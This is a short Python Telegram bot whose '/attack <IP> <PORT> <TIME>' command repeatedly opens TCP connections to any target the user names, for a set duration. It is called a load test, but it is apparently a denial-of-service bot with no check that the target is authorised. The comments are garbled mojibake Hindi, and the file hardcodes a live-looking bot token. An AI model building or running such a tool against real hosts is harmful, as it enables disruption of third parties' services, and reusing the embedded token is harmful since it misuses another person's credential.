import threading
import socket
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = '7792663399:AAGGRAQe4hrlaRiWuKEnj0YcHvmsft9jcFQ'
ADMIN_ID = 7792663399  # ‡§Ø‡§π‡§æ‡§Å ‡§Ö‡§™‡§®‡§æ Telegram ‡§Ø‡•Ç‡§ú‡§º‡§∞ ID ‡§°‡§æ‡§≤‡•á‡§Ç

# TCP packets ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡§æ ‡§´‡§Ç‡§ï‡•ç‡§∂‡§®
def send_test_packets(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            sock.send(b'TESTING123')
            sock.close()
        except:
            pass
        time.sleep(0.1)  # ‡§¨‡§π‡•Å‡§§ ‡§§‡•á‡§ú‡§º ‡§®‡§æ ‡§π‡•ã ‡§á‡§∏‡§≤‡§ø‡§è

# Telegram command ‡§π‡•à‡§Ç‡§°‡§≤‡§∞
async def attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("‚ùå ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <TIME>")
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])

    await update.message.reply_text(f"üü° ‡§ü‡•á‡§∏‡•ç‡§ü ‡§∂‡•Å‡§∞‡•Ç: {ip}:{port} ‡§™‡§∞ {duration} ‡§∏‡•á‡§ï‡§Ç‡§° ‡§ï‡•á ‡§≤‡§ø‡§è...")

    thread = threading.Thread(target=send_test_packets, args=(ip, port, duration))
    thread.start()

    await update.message.reply_text("‚úÖ ‡§≤‡•ã‡§° ‡§ü‡•á‡§∏‡•ç‡§ü ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã ‡§ó‡§Ø‡§æ‡•§")

# ‡§¨‡•ã‡§ü ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§®‡§æ
app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("attack", attack_handler))

print("ü§ñ ‡§¨‡•ã‡§ü ‡§ö‡§æ‡§≤‡•Ç ‡§π‡•à...")
app.run_polling()
